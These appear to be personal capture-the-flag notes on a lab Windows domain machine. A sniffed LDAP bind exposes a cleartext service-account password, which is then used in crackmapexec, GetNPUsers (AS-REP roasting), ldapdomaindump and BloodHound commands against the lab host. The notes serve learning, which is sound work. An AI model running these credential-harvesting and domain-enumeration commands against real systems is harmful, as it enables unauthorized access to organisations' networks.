So we know that to run .exe file in linux we have install wine and able to run 
As well as we are able to query the ldap query 

Let's see what we can catch with wireshark and one tip that where most of the guys make mistake is they chose tun0 and get nothing so we have to either select tun0 or any.

We got a ldap bind request and it seems to some kind of password
![[Pasted image 20231121184323.png]]

```
Frame 14: 130 bytes on wire (1040 bits), 130 bytes captured (1040 bits) on interface any, id 0
Linux cooked capture v1
Internet Protocol Version 4, Src: 10.10.16.3, Dst: 10.10.11.174
Transmission Control Protocol, Src Port: 50842, Dst Port: 389, Seq: 1, Ack: 1, Len: 62
Lightweight Directory Access Protocol
    LDAPMessage bindRequest(1) "support\ldap" simple
        messageID: 1
        protocolOp: bindRequest (0)
            bindRequest
                version: 3
                name: support\ldap
                authentication: simple (0)
                    simple: nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
        [Response In: 18]
```
![[Pasted image 20231121184451.png]]

We got a new user and passwd
```
ldap
nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
```
![[Pasted image 20231121185514.png]]



```
cme smb 10.10.11.174 -d support.local -u 'ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'
```
![[Pasted image 20231121185643.png]]

```
cme smb 10.10.11.174 -d support.local -u 'ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' --shares
```
![[Pasted image 20231121185743.png]]

Now we have a hunch at this point of time that this is something related to ldaps so let's try running it.

```
 GetNPUsers.py SUPPORT/ -usersfile user.txt -format john -dc-ip 10.10.11.174
```

```
ldapdomaindump ldaps://10.10.11.174 -u 'support\ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'
```

I think we have to go back and check the smb share netlogon and sysvol to be precise.
![[Pasted image 20231121191116.png]]

Password Policy
![[Pasted image 20231121191410.png]]

Finally i decided to run Bloodhound previously i used support and not support.htb
```
bloodhound-python -d support.htb -u 'ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -ns 10.10.11.174 -c all
```

![[Pasted image 20231121192737.png]]
As you can see that we have our testing computer in place.

